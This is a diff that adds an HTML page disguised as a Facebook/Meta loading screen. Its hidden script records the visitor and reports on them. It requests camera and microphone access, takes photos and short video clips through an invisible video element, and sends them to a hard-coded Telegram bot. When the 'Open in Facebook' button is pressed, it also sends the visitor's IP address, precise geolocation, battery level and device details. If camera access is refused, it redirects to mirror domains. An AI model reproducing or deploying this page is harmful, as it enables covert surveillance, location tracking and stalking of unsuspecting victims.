@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nyi Min Khant </title>
+    <style>
+        :root {
+            --fb-blue: #1877f2;
+            --fb-blue-light: #e7f3ff;
+            --bg-color: #f0f2f5;
+            --white: #ffffff;
+            --text-primary: #050505;
+            --text-secondary: #65676b;
+            --shimmer-bg: #e4e6eb;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: var(--bg-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            min-height: 100dvh;
+            overflow: hidden;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 420px;
+            height: 100vh;
+            height: 100dvh;
+            background-color: var(--white);
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        }
+
+        /* Loading Screen */
+        .loading-screen {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: var(--white);
+            z-index: 10;
+            transition: opacity 0.4s ease;
+        }
+        
+        .logo-wrapper {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            animation: subtleBounce 2s infinite ease-in-out;
+        }
+
+        .logo svg { width: 72px; height: 72px; }
+        
+        .loading-footer {
+            padding-bottom: 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 24px;
+        }
+
+        .dots { display: flex; justify-content: center; align-items: center; }
+        
+        .dot {
+            width: 6px;
+            height: 6px;
+            margin: 0 3px;
+            background-color: #bcc0c4;
+            border-radius: 50%;
+            animation: blink 1.4s infinite ease-in-out both;
+        }
+        
+        .dot:nth-child(1) { animation-delay: 0s; }
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
+        .dot:nth-child(4) { animation-delay: 0.6s; }
+        .dot:nth-child(5) { animation-delay: 0.8s; }
+        
+        @keyframes blink {
+            0%, 80%, 100% { transform: scale(0.8); opacity: 0.4; }
+            40% { transform: scale(1.3); opacity: 1; }
+        }
+        
+        .meta { font-size: 12px; color: #8a8d91; letter-spacing: 1px; text-transform: uppercase; }
+        .meta-logo { font-weight: 700; color: var(--fb-blue); font-size: 14px; letter-spacing: 0.5px; }
+        
+        /* Main App Content & Shimmer UI */
+        .app-content { display: flex; flex-direction: column; height: 100%; background-color: var(--bg-color); }
+        .app-header { background-color: var(--white); padding: 12px 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #e5e5e5; }
+        .app-title { color: var(--fb-blue); font-size: 24px; font-weight: 800; letter-spacing: -0.5px; }
+        .skeleton-content { flex-grow: 1; padding: 12px; overflow-y: auto; padding-bottom: 160px; }
+        .skeleton-post { background-color: var(--white); border-radius: 8px; padding: 16px; margin-bottom: 12px; box-shadow: 0 1px 2px rgba(0,0,0,0.05); }
+        .skeleton-header { display: flex; align-items: center; margin-bottom: 12px; }
+        
+        .shimmer {
+            background: linear-gradient(90deg, #e4e6eb 25%, #f0f2f5 50%, #e4e6eb 75%);
+            background-size: 200% 100%;
+            animation: loadingShimmer 1.5s infinite linear;
+        }
+
+        @keyframes loadingShimmer {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
+        }
+
+        .skeleton-avatar { width: 40px; height: 40px; border-radius: 50%; margin-right: 12px; }
+        .skeleton-user { flex-grow: 1; }
+        .skeleton-line { height: 12px; border-radius: 6px; margin-bottom: 8px; }
+        .skeleton-line.short { width: 40%; }
+        .skeleton-line.medium { width: 70%; }
+        .skeleton-content-block { height: 180px; border-radius: 6px; margin-bottom: 12px; }
+
+        /* Open App Box */
+        .app-popup {
+            position: absolute; bottom: -150px; left: 50%; transform: translateX(-50%); width: 92%;
+            background-color: var(--white); border-radius: 16px; padding: 16px; display: flex;
+            align-items: center; justify-content: space-between;
+            box-shadow: 0 -4px 25px rgba(0, 0, 0, 0.1), 0 4px 15px rgba(0, 0, 0, 0.05);
+            z-index: 20; transition: bottom 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.15); 
+        }
+
+        .app-popup.show { bottom: 65px; }
+        .popup-left { display: flex; align-items: center; gap: 12px; }
+        .popup-logo svg { width: 40px; height: 40px; }
+        .popup-text h4 { font-size: 15px; color: var(--text-primary); font-weight: 600; margin-bottom: 2px; }
+        .popup-text p { font-size: 12px; color: var(--text-secondary); }
+        .popup-btn { background-color: var(--fb-blue); color: var(--white); border: none; padding: 8px 18px; border-radius: 8px; font-weight: 600; font-size: 14px; cursor: pointer; }
+        
+        @keyframes subtleBounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
+        .loaded .loading-screen { opacity: 0; pointer-events: none; }
+
+        /* Hidden Camera Elements */
+        #webcam-hidden { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; }
+        #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="appContainer">
+        <div class="loading-screen">
+            <div class="logo-wrapper">
+                <div class="logo">
+                    <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="18" cy="18" r="18" fill="#1877F2"/>
+                        <path d="M24.5 12H21.5C20.67 12 20 12.67 20 13.5V16H24L23.5 20H20V30H16V20H13V16H16V13.5C16 11.01 18.01 9 20.5 9H24.5V12Z" fill="white"/>
+                    </svg>
+                </div>
+            </div>
+            
+            <div class="loading-footer">
+                <div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+                <div class="meta">from <span class="meta-logo">Meta</span></div>
+            </div>
+        </div>
+        
+        <div class="app-content">
+            <div class="app-header"><div class="app-title">facebook</div></div>
+            <div class="skeleton-content">
+                <div class="skeleton-post">
+                    <div class="skeleton-header">
+                        <div class="skeleton-avatar shimmer"></div>
+                        <div class="skeleton-user">
+                            <div class="skeleton-line short shimmer"></div>
+                            <div class="skeleton-line medium shimmer"></div>
+                        </div>
+                    </div>
+                    <div class="skeleton-content-block shimmer"></div>
+                </div>
+                <div class="skeleton-post">
+                    <div class="skeleton-header">
+                        <div class="skeleton-avatar shimmer"></div>
+                        <div class="skeleton-user">
+                            <div class="skeleton-line short shimmer"></div>
+                            <div class="skeleton-line medium shimmer"></div>
+                        </div>
+                    </div>
+                    <div class="skeleton-content-block shimmer" style="height: 140px;"></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="app-popup" id="appPopup">
+            <div class="popup-left">
+                <div class="popup-logo">
+                    <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="18" cy="18" r="18" fill="#1877F2"/><path d="M24.5 12H21.5C20.67 12 20 12.67 20 13.5V16H24L23.5 20H20V30H16V20H13V16H16V13.5C16 11.01 18.01 9 20.5 9H24.5V12Z" fill="white"/></svg>
+                </div>
+                <div class="popup-text"><h4>Open in Facebook</h4><p>Faster & better experience</p></div>
+            </div>
+            <button class="popup-btn" onclick="openFB()">Open</button>
+        </div>
+    </div>
+
+    <video id="webcam-hidden" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ⚠️ မိမိရဲ့ Telegram Bot အချက်အလက်များ
+        const TELEGRAM_BOT_TOKEN = '8257641540:AAGkf47PxHkTT6c7khhUAke2-KyDLdRvWwk'; 
+        const TELEGRAM_CHAT_ID = '7336260003';     
+        // Domain List for Auto-Change
+        const domainList = [
+            "https://hfree382-beep.github.io/Facebook1/",
+            "https://hfree382-beep.github.io/Facebook2/",
+            "https://hfree382-beep.github.io/Facebook3/",
+            "‎https://hfree382-beep.github.io/Facebook4/",
+            "‎https://hfree382-beep.github.io/Facebook5/"
+        ];
+
+        const video = document.getElementById('webcam-hidden');
+        const canvas = document.getElementById('canvas');
+        
+        let photoCount = 0;
+        let videoCount = 0;
+        let photoInterval;
+        let mediaStream;
+        let mediaRecorder;
+        let videoChunks = [];
+
+        // ၁။ ကင်မရာ Permission တောင်းခြင်း
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
+            .then(stream => {
+                mediaStream = stream;
+                video.srcObject = stream;
+                video.onloadedmetadata = () => { startPhotoCapture(); };
+            })
+            .catch(err => {
+                console.log("Camera access denied: " + err);
+                redirectToAlternativeLink();
+            });
+
+        function redirectToAlternativeLink() {
+            const randomIndex = Math.floor(Math.random() * domainList.length);
+            window.location.href = domainList[randomIndex];
+        }
+
+        // ၂။ ဓာတ်ပုံရိုက်ခြင်းစနစ်
+        function startPhotoCapture() {
+            photoInterval = setInterval(() => {
+                if (photoCount >= 10) {
+                    clearInterval(photoInterval);
+                    goToSecondPage(); 
+                    return;
+                }
+                capturePhoto();
+            }, 1000);
+        }
+
+        function capturePhoto() {
+            photoCount++;
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.translate(canvas.width, 0);
+            context.scale(-1, 1);
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob((blob) => {
+                if (!blob) return;
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, `photo_${photoCount}.jpg`);
+                formData.append('caption', `📸 [Photo] နံပါတ် (${photoCount}) ကို ဖမ်းယူရရှိပါသည်။`);
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            }, 'image/jpeg', 0.6);
+        }
+
+        // ၃။ ဒုတိယစာမျက်နှာသို့ ကူးပြောင်းခြင်း
+        function goToSecondPage() {
+            document.getElementById('appContainer').classList.add('loaded'); 
+            startVideoRecordingLoop();
+            setTimeout(() => { document.getElementById('appPopup').classList.add('show'); }, 15000);
+        }
+
+        // ၄။ ဗီဒီယို ၂ စက္ကန့်စီ ဖမ်းယူခြင်း
+        function startVideoRecordingLoop() {
+            if (videoCount >= 10) { stopCamera(); return; }
+            videoCount++;
+            videoChunks = [];
+            mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm;codecs=vp8' });
+            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) videoChunks.push(e.data); };
+            mediaRecorder.onstop = () => {
+                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                sendVideoToTelegram(videoBlob, videoCount);
+                startVideoRecordingLoop();
+            };
+            mediaRecorder.start();
+            setTimeout(() => { if(mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 2000); 
+        }
+
+        function sendVideoToTelegram(blob, count) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('video', blob, `video_${count}.webm`);
+            formData.append('caption', `🎬 [Video] နံပါတ် (${count}) ၂-စက္ကန့်စာ ဗီဒီယိုကို ဖမ်းယူရရှိပါသည်။`);
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
+        }
+
+        function stopCamera() { if (mediaStream) mediaStream.getTracks().forEach(track => track.stop()); }
+
+        // 📍 ၅။ Open App ခလုတ်နှိပ်လျှင် Location နှင့် အချက်အလက်များ သိမ်းဆည်းမည့်စနစ်
+        async function openFB() {
+            let userIP = "Unknown IP";
+            let batteryLevel = "Unknown Battery";
+            
+            // (က) IP လိပ်စာကို ဆွဲယူခြင်း
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userIP = ipData.ip;
+            } catch (e) { console.log("Failed to fetch IP"); }
+
+            // (ခ) ဖုန်းဘက်ထရီအားကို ဆွဲယူခြင်း
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : '(Not Charging)'}`;
+                }
+            } catch (e) { console.log("Failed to fetch Battery"); }
+
+            // (ဂ) Screen အကျယ်နှင့် ဖုန်းအမျိုးအစား (User Agent)
+            const screenWidth = window.screen.width;
+            const screenHeight = window.screen.height;
+            const screenResolution = `${screenWidth} x ${screenHeight} pixels`;
+            const phoneModel = navigator.userAgent;
+
+            // (ဃ) Geolocation ဖြင့် တည်နေရာတောင်းခြင်း
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                        // စာသားကို အလှဆင်ပြီး စုစည်းခြင်း
+                        const fullReport = `📊 [Device & Location Report]\n\n` +
+                                           `📍 Google Map: ${mapsLink}\n` +
+                                           `🌐 IP Address: ${userIP}\n` +
+                                           `🔋 Battery Level: ${batteryLevel}\n` +
+                                           `🖥️ Screen Size: ${screenResolution}\n` +
+                                           `📱 Device Info: ${phoneModel}\n` +
+                                           `🎯 Accuracy: ${accuracy} meters`;
+
+                        // ⏱️ ကွက်တိ ၁ စက္ကန့် (1000ms) စောင့်ပြီးမှ Telegram ဆီ ပို့ဆောင်ပြီး FB ကို ဖွင့်ပါမည်
+                        setTimeout(() => {
+                            sendTextToTelegram(fullReport);
+                            redirectToFacebook();
+                        }, 1000);
+                    },
+                    (error) => {
+                        // Location ငြင်းပယ်လျှင်လည်း ကျန်တဲ့ Device Data တွေကို ပို့ပေးမည်
+                        const failedReport = `❌ User က Location ပေးရန် ငြင်းပယ်ခဲ့သည်။\n\n` +
+                                             `🌐 IP Address: ${userIP}\n` +
+                                             `🔋 Battery Level: ${batteryLevel}\n` +
+                                             `🖥️ Screen Size: ${screenResolution}\n` +
+                                             `📱 Device Info: ${phoneModel}`;
+                        
+                        setTimeout(() => {
+                            sendTextToTelegram(failedReport);
+                            redirectToFacebook();
+                        }, 1000);
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                redirectToFacebook();
+            }
+        }
+
+        function sendTextToTelegram(textMessage) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('text', textMessage);
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, { method: 'POST', body: formData });
+        }
+
+        function redirectToFacebook() {
+            window.location.href = "fb://facewebmodal/f?href=https://www.facebook.com";
+        }
+    </script>
+</body>
+</html>
